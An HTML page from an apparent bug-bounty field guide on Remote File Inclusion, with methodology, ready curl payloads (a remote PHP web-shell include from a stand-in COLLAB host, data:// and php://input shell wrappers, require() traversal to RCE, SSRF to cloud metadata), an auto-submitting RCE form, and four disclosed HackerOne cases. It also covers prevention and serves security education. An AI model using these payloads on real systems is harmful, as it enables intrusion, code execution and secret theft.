@@ -1,0 +1,223 @@
+<!doctype html><html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Remote File Inclusion · The Hacktivity Field Guide</title>
+<meta name="description" content="">
+<link rel="icon" href="/favicon.jpg">
+<script>try{var t=localStorage.getItem('fg-theme');if(t)document.documentElement.setAttribute('data-theme',t);}catch(e){}</script>
+<link rel="stylesheet" href="../assets/style.css">
+<script>window.SITE_ROOT="../";</script>
+</head><body>
+<div class="ethics" id="ethics"><b>⚠ Authorized testing only.</b> Disclosed public bug-bounty data for defensive/educational research. Use payloads only against systems you are permitted to test. <button id="ethicsX">Dismiss</button></div>
+<div class="top">
+  <button class="hamb" id="hamb" aria-label="Open navigation">☰</button>
+  <a class="brand" href="../index.html"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide<small>Real-world web hacking, catalogued</small></span></a>
+  <a class="tbtn" href="/" aria-label="Main site" title="Gill.Singh.A" style="text-decoration:none">⌂</a><div class="searchwrap"><span class="mag">🔎</span><input id="q" type="search" placeholder="Search techniques, programs, report IDs…" autocomplete="off" aria-label="Search"><div class="results" id="results"></div></div>
+  <button class="tbtn" id="themeBtn" aria-label="Toggle light/dark">◐</button>
+</div>
+<div class="crumb"><a href="../index.html">Field Guide</a><span class="sep">/</span><b>Vulnerabilities</b><span class="sep">/</span><b>Remote File Inclusion</b></div>
+<div class="shell">
+  <aside class="side" id="side" aria-label="Taxonomy"><div class="nav">
+<a class="navhome" href="../index.html">⌂ Home</a>
+<div class="nav-h">Methodology</div>
+<a href="../methodology/recon.html">Recon</a>
+<a href="../methodology/choosing-targets.html">Choosing targets</a>
+<a href="../methodology/triage-and-impact.html">Triage & impact</a>
+<a href="../methodology/reporting.html">Reporting</a>
+<div class="nav-h">Injection</div>
+<a class="" href="../vulnerabilities/sqli.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>SQL Injection<span class="n">122</span></a>
+<a class="" href="../vulnerabilities/command-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>OS Command Injection<span class="n">85</span></a>
+<a class="" href="../vulnerabilities/code-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Code Injection<span class="n">86</span></a>
+<a class="" href="../vulnerabilities/ssti.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Template Injection<span class="n">14</span></a>
+<a class="" href="../vulnerabilities/injection-other.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>LDAP / XML / Other Injection<span class="n">77</span></a>
+<a class="" href="../vulnerabilities/crlf-http-splitting.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>CRLF / HTTP Response Splitting<span class="n">22</span></a>
+<a class="" href="../vulnerabilities/xxe.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>XML External Entities (XXE)<span class="n">25</span></a>
+<a class="on" href="../vulnerabilities/rfi.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Remote File Inclusion<span class="n">4</span></a>
+<div class="nav-h">Client-side</div>
+<a class="" href="../vulnerabilities/xss.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Scripting (XSS)<span class="n">936</span></a>
+<a class="" href="../vulnerabilities/csrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Request Forgery (CSRF)<span class="n">144</span></a>
+<a class="" href="../vulnerabilities/clickjacking.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Clickjacking<span class="n">20</span></a>
+<a class="" href="../vulnerabilities/open-redirect.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Open Redirect<span class="n">151</span></a>
+<a class="" href="../vulnerabilities/spoofing-phishing.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Content Spoofing &amp; Phishing<span class="n">74</span></a>
+<div class="nav-h">Access control</div>
+<a class="" href="../vulnerabilities/idor.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>IDOR / BOLA<span class="n">248</span></a>
+<a class="" href="../vulnerabilities/access-control.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Broken Access Control<span class="n">494</span></a>
+<a class="" href="../vulnerabilities/privilege-escalation.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Privilege Escalation<span class="n">88</span></a>
+<a class="" href="../vulnerabilities/mass-assignment.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Mass Assignment<span class="n">16</span></a>
+<div class="nav-h">Auth & session</div>
+<a class="" href="../vulnerabilities/auth.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Authentication &amp; ATO<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/session.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Session Management<span class="n">61</span></a>
+<div class="nav-h">Server-side</div>
+<a class="" href="../vulnerabilities/ssrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Request Forgery (SSRF)<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/path-traversal.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Path Traversal / LFI<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/deserialization.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Insecure Deserialization<span class="n">69</span></a>
+<a class="" href="../vulnerabilities/request-smuggling.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>HTTP Request Smuggling<span class="n">33</span></a>
+<a class="" href="../vulnerabilities/cache.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Web Cache Poisoning &amp; Deception<span class="n">36</span></a>
+<a class="" href="../attack-surface/file-upload.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>File Upload<span class="n">66</span></a>
+<div class="nav-h">Logic & infra</div>
+<a class="" href="../vulnerabilities/business-logic.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Business Logic Flaws<span class="n">267</span></a>
+<a class="" href="../vulnerabilities/race-condition.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Race Conditions<span class="n">42</span></a>
+<a class="" href="../vulnerabilities/dos-resource.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Denial of Service<span class="n">296</span></a>
+<a class="" href="../vulnerabilities/misconfiguration.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Security Misconfiguration<span class="n">119</span></a>
+<a class="" href="../vulnerabilities/unclassified.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Protocol, Config &amp; Infra Injection (long tail)<span class="n">218</span></a>
+<a class="" href="../vulnerabilities/supply-chain.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Supply Chain &amp; Malicious Code<span class="n">31</span></a>
+<a class="" href="../vulnerabilities/logging.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Logging &amp; Monitoring Failures<span class="n">14</span></a>
+<div class="nav-h">Disclosure & crypto</div>
+<a class="" href="../vulnerabilities/info-disclosure.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Information Disclosure<span class="n">568</span></a>
+<a class="" href="../vulnerabilities/crypto.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cryptographic Issues<span class="n">91</span></a>
+<a class="" href="../vulnerabilities/mitm.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Man-in-the-Middle<span class="n">12</span></a>
+<div class="nav-h">Binary</div>
+<a class="" href="../vulnerabilities/memory-corruption.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Memory Corruption<span class="n">324</span></a>
+<div class="nav-h">Emerging</div>
+<a class="" href="../vulnerabilities/llm-ai.html"><span class="dot" style="background:var(--sev-med)" title="Medium"></span>LLM / AI Attacks<span class="n">3</span></a>
+<div class="nav-h">Attack surface</div>
+<a class="" href="../attack-surface/graphql.html">GraphQL<span class="n">42</span></a>
+<a class="" href="../attack-surface/oauth.html">OAuth 2.0 / OIDC<span class="n">62</span></a>
+<a class="" href="../attack-surface/jwt.html">JSON Web Tokens (JWT)<span class="n">10</span></a>
+<a class="" href="../attack-surface/saml.html">SAML<span class="n">5</span></a>
+<a class="" href="../attack-surface/cors.html">CORS Misconfiguration<span class="n">22</span></a>
+<a class="" href="../attack-surface/subdomain-takeover.html">Subdomain Takeover<span class="n">121</span></a>
+<a class="" href="../attack-surface/account-takeover.html">Account Takeover Chains<span class="n">101</span></a>
+<a class="" href="../attack-surface/file-upload.html">File Upload<span class="n">66</span></a>
+<a class="" href="../attack-surface/cloud-aws.html">Cloud Metadata &amp; Keys</a>
+<a class="" href="../attack-surface/webhooks.html">Webhooks &amp; Integrations</a>
+<a class="" href="../attack-surface/mobile.html">Mobile &amp; Thick-Client</a>
+<div class="nav-h">Field notes</div>
+<a href="../chains.html">Exploit chains</a><a href="../payloads.html">Payload libraries</a>
+</div></aside>
+  <main class="main">
+    <header class="entry-head">
+      <div class="kicker"><span class="dot" style="background:var(--sev-crit)"></span>Vulnerabilities</div>
+      <h1>Remote File Inclusion</h1>
+      <div class="meta-row"><span class="chip">Specimens <b>4</b></span><a class="chip lab" href="https://portswigger.net/web-security/file-path-traversal" target="_blank" rel="noopener">⚑ Practice — PortSwigger: <b>Path traversal</b></a></div>
+    </header>
+    <div class="thin-note">⚠ Thin coverage — only 4 disclosed reports for this class; illustrative, not exhaustive.</div>
+    <h2 class="sec" id="basic-information"><span class="tick">§</span>Basic information</h2>
+<p>Remote File Inclusion (RFI) is what happens when <strong>attacker input decides which file, module, or URL the server loads</strong> — not merely which data it reads. The classic form is <code>include($_GET['page'])</code> reaching out to <code>http://COLLAB/shell.txt</code>, but the primitive is broader than PHP: any time a request value flows into a load API — <code>include</code>/<code>require</code>/<code>import</code>, an image library that embeds a file you name, a headless-browser renderer, or a <code>fetch(url=)</code> proxy — a <strong>data channel becomes a code/content-load channel</strong>.</p>
+<p>The distinction from path traversal / LFI is <em>where the resource comes from and what the server does with it</em>. LFI reads a local file; RFI pulls (or names) an <strong>arbitrary</strong> resource — a remote script, an out-of-tree <code>.js</code>, a loopback URL, or an on-disk file the app never meant to touch. Because the endpoint of the channel is a loader, RFI is almost always a <strong>step to RCE, arbitrary file read, or SSRF</strong>, rarely a leaf bug. The whole game is finding the sink where "which file" is attacker-controlled and the loader trusts it.</p>
+<h2 class="sec" id="methodology"><span class="tick">§</span>Methodology</h2>
+<ol><li><strong>Find load sinks.</strong> For every parameter, path segment, and uploaded artifact, ask: <em>does my input pick the file/module/URL the server loads?</em> Grep the surface for <code>?url=</code>, <code>?page=</code>, <code>?file=</code>, <code>?path=</code>, <code>?template=</code>, <code>?src=</code>, anything ending in a filename, and any endpoint that hands back a <strong>processed copy</strong> of what you uploaded.</li><li><strong>Fire an out-of-band canary.</strong> Point the suspected loader at your collaborator and watch for a server-side hit — a real fetch resolves it; string reflection does not.</li><li><strong>Classify the loader</strong> — remote-URL include (classic RFI), dynamic module <code>require()</code>, URL-fetch proxy/renderer, or media-library file embed. Each has a different confirm-and-weaponize path.</li><li><strong>Confirm control</strong>, not just reachability. A traversal that errors with <em>module-not-found</em> proves your input is joined into the load path; a rendered remote <code>&lt;script&gt;</code> proves the origin trusts your content.</li><li><strong>Weaponize to the surface's ceiling</strong> — remote code load → RCE, image embed → arbitrary file read, proxy render → XSS-on-trusted-origin + SSRF.</li></ol>
+<div class="pre" data-lang="bash"># Universal RFI/SSRF canary: does input reach a real server-side fetch?
+curl 'http://TARGET/index.php?page=http://COLLAB/canary'
+# tell: COLLAB logs a request -&gt; the loader fetches attacker URLs (RFI/SSRF live)</div>
+<h2 class="sec" id="load-sink-variants"><span class="tick">§</span>Load-sink variants</h2>
+<p>Identify which loader your input reaches, then use the matching confirm-and-weaponize block.</p>
+<h3 class="sub" id="classic-remote-url-include-php">Classic remote-URL include (PHP)</h3>
+<p><code>include</code>/<code>require</code>/<code>include_once</code> on a value you control, with <code>allow_url_include=On</code> (and <code>allow_url_fopen=On</code>). Point it at a remote script; the interpreter fetches <strong>and executes</strong> it in-process.</p>
+<div class="pre" data-lang="bash"># Host shell.txt: &lt;?php system($_GET['c']); ?&gt;  (NOT a .php file — you want the raw source served)
+curl 'http://TARGET/index.php?page=http://COLLAB/shell.txt&amp;c=id'</div>
+<p>If the app appends an extension (<code>include($page . ".php")</code>), strip it with a query/fragment so the remote fetch ignores the suffix:</p>
+<div class="pre" data-lang="bash"># server requests http://COLLAB/shell.txt?.php  -&gt; the ?.php is just a querystring, source still runs
+curl 'http://TARGET/index.php?page=http://COLLAB/shell.txt%3f'
+# fragment variant: http://COLLAB/shell.txt%23  (the #.php is dropped by the fetch)</div>
+<p>When the outbound fetch is blocked (<code>allow_url_fopen=Off</code>) but the include still evaluates PHP, pivot to fetch-free wrappers (this is the RFI→LFI boundary — same sink, local payload). Note the flag dependency: <code>data://</code> and <code>php://input</code> still require <code>allow_url_include=On</code> (they only skip the network fetch), whereas <code>php://filter</code> works even with it Off:</p>
+<div class="pre" data-lang="bash"># data:// wrapper — inline the payload, no remote host needed (needs allow_url_include=On)
+curl 'http://TARGET/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOz8+&amp;c=id'
+# php://input — POST the payload as the request body (needs allow_url_include=On)
+curl -s 'http://TARGET/index.php?page=php://input' --data '&lt;?php system("id"); ?&gt;'
+# php://filter — works with allow_url_include=Off; base64-read local source (chainable to RCE)
+curl 'http://TARGET/index.php?page=php://filter/convert.base64-encode/resource=index.php'</div>
+<h3 class="sub" id="dynamic-module-load-node-require-import">Dynamic module load (Node <code>require</code>/<code>import</code>)</h3>
+<p>Routers that build a module path by joining a base dir with <code>req.url</code> and pass it to <code>require()</code>. The URL is a <strong>code-load sink</strong> — a traversal points <code>require()</code> at any <code>.js</code> on disk. Client-side normalization eats <code>../</code>, so you must send it raw.</p>
+<div class="pre" data-lang="bash"># --path-as-is preserves ../ so the traversal reaches the server-side require() join
+curl --path-as-is 'http://TARGET/../../../../../../hack'
+# tell: MODULE_NOT_FOUND / a side-effect from the loaded file confirms req.url -&gt; require()
+# (some frameworks need fewer segments): curl --path-as-is 'http://TARGET/../hack'</div>
+<p>Weaponize by pairing with <strong>any attacker-writable path</strong> — an upload dir, a log file, a temp file — then require that file to execute it:</p>
+<div class="pre" data-lang="bash"># after planting attacker.js via an upload/log-write primitive:
+curl --path-as-is 'http://TARGET/../../../../../../var/www/uploads/attacker.js'
+# require() loads and runs it -&gt; RCE</div>
+<h3 class="sub" id="url-fetch-proxy-renderer">URL-fetch proxy / renderer</h3>
+<p>"Fetch this URL and show it" features — <code>plain.php?url=</code>, link previews, "import from URL", HTML/URL-to-PDF renderers. With no host/scheme/filetype allowlist this is a <strong>double bug</strong>: remote content served from the trusted origin (XSS) <em>and</em> arbitrary internal reach (SSRF).</p>
+<div class="pre" data-lang="bash"># host t.html:  &lt;script&gt;alert(document.domain)&lt;/script&gt;
+curl 'http://TARGET/proxys/plain.php?url=http://COLLAB/t.html&amp;operation=GetParameterInfo'
+# remote HTML/JS now executes under TARGET's origin -&gt; stored/reflected XSS
+# then pivot url= at internal hosts/files -&gt; SSRF / internal scan
+curl 'http://TARGET/proxys/plain.php?url=http://169.254.169.254/latest/meta-data/'</div>
+<p>Headless-Chrome "render my template" variants fetch the resources named in your HTML server-side — the same SSRF primitive, now reaching loopback-only services:</p>
+<div class="pre" data-lang="html">&lt;!-- an &lt;img&gt;/&lt;form&gt;/&lt;iframe&gt; in the rendered template fires a server-side fetch --&gt;
+&lt;img src="http://127.0.0.1:PORT/status"&gt;</div>
+<h3 class="sub" id="media-library-file-embed-image-processors">Media-library file embed (image processors)</h3>
+<p>The subtlest RFI: no path appears in any URL param. A vulnerable ImageMagick (CVE-2022-44268) embeds the <strong>contents of a file you name in a PNG <code>tEXt</code> <code>profile</code> chunk</strong> into the re-encoded output. Any resize/convert pipeline that hands the processed image back becomes an arbitrary local file read — the sink is the image library, not app code.</p>
+<div class="pre" data-lang="bash"># 1) craft a PNG whose tEXt 'profile' value is an absolute target path (metabaseq PoC style):
+#      profile = /etc/passwd      (or an app secret / config file)
+# 2) upload it to ANY resize/avatar/thumbnail endpoint, download the processed copy, then:
+identify -verbose resized.png                          # copy the 'Raw profile type:' hex blob
+python3 -c "print(bytes.fromhex('2c2c2c...').decode())"   # -&gt; the leaked file contents</div>
+<div class="callout tip"><span class="ico">▸ TIP</span><div>Probe <strong>every</strong> resize/convert/thumbnail endpoint, not just obvious upload forms — anything that returns a re-encoded copy of your image is a candidate. To hunt or to confirm prior exploitation, grep image metadata for the literal string <code>tEXtprofile</code>.</div></div>
+<h2 class="sec" id="bypasses"><span class="tick">§</span>Bypasses</h2>
+<div style="overflow-x:auto"><table class="bx"><thead><tr><th>Filter / control</th><th>Bypass</th><th>Seen in</th></tr></thead><tbody><tr><td>Client-side path normalization strips <code>../</code></td><td>send the traversal with <code>curl --path-as-is</code> so <code>../</code> survives to the server-side <code>require()</code> join</td><td>#566056</td></tr><tr><td>No path/injection accepted in any URL param</td><td>put the target path in a <strong>PNG <code>tEXt</code> <code>profile</code> chunk</strong> — the image library reads the file, app code never sees a path</td><td>#1858574</td></tr><tr><td>Naive JSON body parser on an internal RPC</td><td><code>enctype="text/plain"</code> form POST smuggles a JSON body (<code>{"test":1,"options":{...}}</code>) past the parser to the loopback service</td><td>#660565</td></tr><tr><td>Random / unknown internal service port</td><td>HTML-to-PDF resource-load errors leak it (<code>connect ECONNREFUSED 127.0.0.1:&lt;port&gt;</code>); binary-scan 1024–65535</td><td>#660565</td></tr><tr><td>Host / filetype allowlist absent</td><td>a single unvalidated <code>url=</code> yields both remote-HTML XSS on the origin <em>and</em> SSRF</td><td>#192940</td></tr><tr><td>Appended <code>.php</code> extension on include</td><td>truncate with <code>?</code>/<code>#</code> (<code>shell.txt%3f</code>) so the remote fetch drops the suffix; or null-byte on old PHP (<code>%00</code>)</td><td>general</td></tr></tbody></table></div>
+<div class="callout warn"><span class="ico">▲ WARNING</span><div><code>allow_url_include</code> has defaulted to <strong>Off</strong> since PHP 5.2, so classic remote-URL RFI is rare on modern stacks. Do not stop at "remote include blocked" — the <em>same include sink</em> almost always still evaluates <code>data://</code>, <code>php://input</code>, and <code>php://filter</code> payloads (LFI→RCE), and the modern loader variants (Node <code>require</code>, media embeds, URL proxies) don't depend on that flag at all.</div></div>
+<h2 class="sec" id="escalation-impact"><span class="tick">§</span>Escalation &amp; impact</h2>
+<p>Every RFI variant is a stepping stone, not an endpoint — chase the ceiling of the loader:</p>
+<ul><li><strong>Remote/local code load → RCE</strong> — a fetched or on-disk script executes in-process. Classic PHP RFI is direct RCE; the Node <code>require()</code> variant reaches RCE the moment any attacker-writable path exists (#566056).</li><li><strong>Media embed → arbitrary file read → secret exfiltration</strong> — CVE-2022-44268 reads app secrets and config off disk with no traversal or injection anywhere in a URL; severe enough to force full secret rotation (#1858574).</li><li><strong>URL-fetch proxy → XSS on the trusted origin + SSRF</strong> — remote HTML rendered under the target's origin is stored/reflected XSS, and the same <code>url=</code> reaches internal hosts and cloud metadata (#192940). See the SSRF and XSS pages.</li><li><strong>HTML-to-PDF SSRF → loopback port scan → unintended <code>require</code> → RCE</strong> — render-my-template SSRF, verbose debug-log error strings as a <strong>port oracle</strong>, then <code>execModulePath</code> to run a stored script — a full low→critical chain (#660565).</li></ul>
+<h2 class="sec" id="prevention"><span class="tick">§</span>Prevention</h2>
+<ul><li><strong>Never build a load path from request input.</strong> Map user input to a fixed <strong>allowlist</strong> of module/template names — never <code>include()</code>/<code>require()</code>/<code>import()</code> a value derived from <code>req.url</code> or a query param. A hard allowlist (not a <code>../</code> filter) is the durable fix.</li><li><strong>Disable remote includes</strong> (<code>allow_url_include=Off</code>, and <code>allow_url_fopen=Off</code> where feasible) and, in code, block the <code>php://</code>, <code>data://</code>, and <code>expect://</code> wrappers on any include sink.</li><li><strong>Patch/upgrade the media library</strong> — ImageMagick ≥ 7.1.0-52 (or a distro build with the CVE-2022-44268 fix backported to the 6.9.x branch) removes the tEXt-profile read; a <code>policy.xml</code> can also disable the vulnerable coder as defense-in-depth.</li><li><strong>URL-fetch features need a host + scheme + filetype allowlist</strong>, must render fetched content off-origin (sandboxed, never as <code>text/html</code> on the trusted domain), and must block RFC1918/loopback to kill the SSRF half.</li><li><strong>Disable debug/verbose logging in production</strong> — differential error strings become port and service oracles.</li></ul>
+<h2 class="sec" id="tools"><span class="tick">§</span>Tools</h2>
+<ul><li><strong><code>curl --path-as-is</code></strong> — send traversal that survives client-side normalization to reach <code>require()</code>/<code>include()</code> joins.</li><li><strong>Burp Collaborator / interactsh</strong> — out-of-band confirmation for remote-include and SSRF fetches.</li><li><strong>ImageMagick <code>identify -verbose</code></strong> + the metabaseq CVE-2022-44268 PNG generator — craft and read the leaked <code>Raw profile type</code> hex.</li><li><strong>Burp Repeater/Intruder</strong> — drive the loopback port scan and differential-error oracle.</li><li><strong>Skill <code>19-path-traversal-lfi-rfi</code></strong> — the runnable end-to-end runbook (wrappers, log poisoning, RFI).</li></ul>
+    <h2 class="sec" id="specimens"><span class="tick">✦</span>Specimens — real-world examples</h2>
+    <p>The techniques above are the general method. Below, each disclosed HackerOne report is a catalogued example — concrete payload, outcome, and matching practice lab. <b>4</b> in this class.</p>
+    <div class="sortbar"><label for="sort">Sort specimens:</label>
+      <select id="sort"><option value="score">Best first</option><option value="votes">Most votes</option><option value="bounty">Highest bounty</option><option value="sev">Severity</option></select>
+      <span style="margin-left:auto;color:var(--muted);font-size:12px" id="showing"></span></div>
+    <div class="specimens" id="specimens"><article class="spec" id="report-1858574" style="--sv:var(--sev-crit)" data-sev="4" data-votes="371" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>ImageMagick CVE-2022-44268 arbitrary file read via malicious PNG</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#1858574</b> · security · awarded · 371 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span><span>Chain <b>local file read -&gt; exfiltrate app secrets/config -&gt; se</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A vulnerable ImageMagick (&lt;7.1.0-52 / 6.9.x) embeds the contents of a file named in a PNG tEXt 'profile' chunk into the output image's raw profile when re-encoding. Any image-resize/convert pipeline that echoes the processed image back becomes an arbitrary local file read.</p>
+<h4>Method</h4><ol><li>Find an upload that resizes/re-encodes images server-side (avatar, profile picture, attachment thumbnailing).</li><li>Craft a PNG whose tEXt 'profile' chunk value is an absolute path to a target file (e.g. /etc/passwd or an app secret/config).</li><li>Upload it, then download the server-processed/resized copy.</li><li>Run `identify -verbose out.png`, take the `Raw profile type` hex blob and decode it to recover the file contents.</li></ol>
+<div class="pre"># build the malicious PNG (metabaseq PoC style): set tEXt 'profile' to target path
+# then after download:
+identify -verbose resized.png    # read 'Raw profile type:' hex
+python -c "print(bytes.fromhex('2c2c2c...').decode())"</div>
+<p class="insight"><b>Insight —</b> Any server-side image processing that returns the re-encoded image is a candidate for CVE-2022-44268 file read — probe every resize/convert endpoint, not just obvious upload forms. Malicious payloads are detectable by the string 'tEXtprofile' in image metadata (useful both to hunt and to scan a corpus for prior exploitation).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1858574" target="_blank" rel="noopener">hackerone.com/reports/1858574</a></span><a class="src" href="#report-1858574" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-path-traversal" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-660565" style="--sv:var(--sev-high)" data-sev="3" data-votes="8" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>jsreport SSRF + unintended-require chained to RCE</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#660565</b> · nodejs-ecosystem · none · 8 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>web</b></span><span>Chain <b>HTML-to-PDF SSRF -&gt; localhost port scan (debug-log oracle</b></span></div>
+<h4>Root cause</h4><p style="margin:0">jsreport renders user HTML to PDF via headless Chrome (Puppeteer), giving the attacker server-side request forgery from within the report. A separate script-manager listens on a random localhost port and honors execModulePath (unintended require). SSRF is used to find and drive script-manager, executing an attacker-stored js file — full RCE.</p>
+<h4>Method</h4><ol><li>Supply an HTML template with remote/internal resource loads (img/form) — the PDF render fetches them server-side (SSRF).</li><li>Use Debug/logsToResponse mode: ECONNREFUSED vs HTTP 500 in the log distinguishes closed vs open localhost ports; a fast follow-up request leaks the exact port in 'connect ECONNREFUSED 127.0.0.1:&lt;port&gt;'.</li><li>Binary/divide-and-conquer scan 1024-65535 to locate script-manager's random port.</li><li>Store a js payload as a jsreport script (pwn.js).</li><li>From a rendered template, auto-submit a form POST to the script-manager port with execModulePath pointing at the stored script's content.js to execute it.</li></ol>
+<div class="pre">&lt;!-- SSRF probe / exploit form, xxxx = script-manager port --&gt;
+&lt;form id="pwn-form" enctype="text/plain" method="POST" action="http://localhost:xxxx/"&gt;
+  &lt;input type="hidden" name='{"test' value='":1, "options": {"rid": 12, "execModulePath": "./../../../data/pwn.js/content.js"}}' /&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('pwn-form').submit();&lt;/script&gt;</div>
+<p class="insight"><b>Insight —</b> Any 'render my HTML/URL to PDF/image' feature is an SSRF primitive; combine it with a loopback-only internal service that trusts localhost to reach otherwise-unreachable RCE sinks. Verbose/debug log modes are a port-oracle — differential error messages leak internal service ports. enctype=text/plain form POST smuggles a JSON body past a naive parser.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/660565" target="_blank" rel="noopener">hackerone.com/reports/660565</a></span><a class="src" href="#report-660565" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-path-traversal" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-566056" style="--sv:var(--sev-med)" data-sev="2" data-votes="7" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Node unintended require via URL-controlled controller path</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#566056</b> · nodejs-ecosystem · none · 7 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>web</b></span><span>Chain <b>unintended require -&gt; load arbitrary on-disk js -&gt; RCE</b></span></div>
+<h4>Root cause</h4><p style="margin:0">larvitbase-api/www build a controller module path by joining a base dir with the request URL (req.urlBase) and pass it to require(); a traversal in the URL forces require() to load arbitrary .js files on disk that were never meant to run as controllers.</p>
+<h4>Method</h4><ol><li>Identify a Node app that dynamically require()s a module derived from the request path.</li><li>Send a path-traversal URL (use curl --path-as-is so ../ is not normalized client-side) to point require() at an out-of-tree .js file.</li><li>Observe execution of the unintended module (side effects / errors confirm load).</li></ol>
+<div class="pre">curl --path-as-is 'http://localhost:8001/../../../../../../hack'
+# larvitbase-www variant needs fewer segments:
+curl --path-as-is 'http://localhost:8001/../hack'</div>
+<p class="insight"><b>Insight —</b> When routing maps req.url straight into require()/import()/include path, the URL is a code-load sink, not just a data sink — the transferable primitive is 'attacker controls the x in require(x)'. Combine with any writable-file bug (upload, log, temp) to reach RCE. Always send traversal with --path-as-is to defeat client-side normalization.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/566056" target="_blank" rel="noopener">hackerone.com/reports/566056</a></span><a class="src" href="#report-566056" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-path-traversal" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-192940" style="--sv:var(--sev-med)" data-sev="2" data-votes="5" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>URL-fetch proxy renders remote HTML -&gt; XSS + pseudo-SSRF</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#192940</b> · deptofdefense · none · 5 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Chain <b>RFI/remote-content render -&gt; reflected XSS on trusted ori</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A proxy endpoint (plain.php?url=) fetches and renders the content of any attacker-supplied URL with no host/filetype whitelist, so attacker-hosted HTML/JS is served from the trusted origin (stored/reflected XSS) and internal hosts can be reached (SSRF).</p>
+<h4>Method</h4><ol><li>Host t.html with a &lt;script&gt; payload on your server</li><li>Request plain.php?url=http://attacker/t.html&amp;...</li><li>Response renders your HTML/JS under the target origin</li><li>Point url= at internal IPs/files to scan/reach internal resources</li></ol>
+<div class="pre">http://TARGET/.../proxys/plain.php?url=http://attacker_server/t.html&amp;operation=GetParameterInfo&amp;parameter=countryBoundaryLayer&amp;outputFormat=JSON
+# t.html: &lt;script&gt;alert(document.cookie)&lt;/script&gt;</div>
+<p class="insight"><b>Insight —</b> Any 'fetch this URL and show it' feature (proxy, preview, import) without a whitelist is a double bug: remote content rendered on your origin = XSS, and arbitrary url= = SSRF/internal scanning. Test both immediately.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/192940" target="_blank" rel="noopener">hackerone.com/reports/192940</a></span><a class="src" href="#report-192940" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-path-traversal" target="_blank" rel="noopener">⚑ Lab</a></div></article></div>
+    
+    <h2 class="sec" id="refs"><span class="tick">§</span>References &amp; practice</h2>
+<ol class="refs">
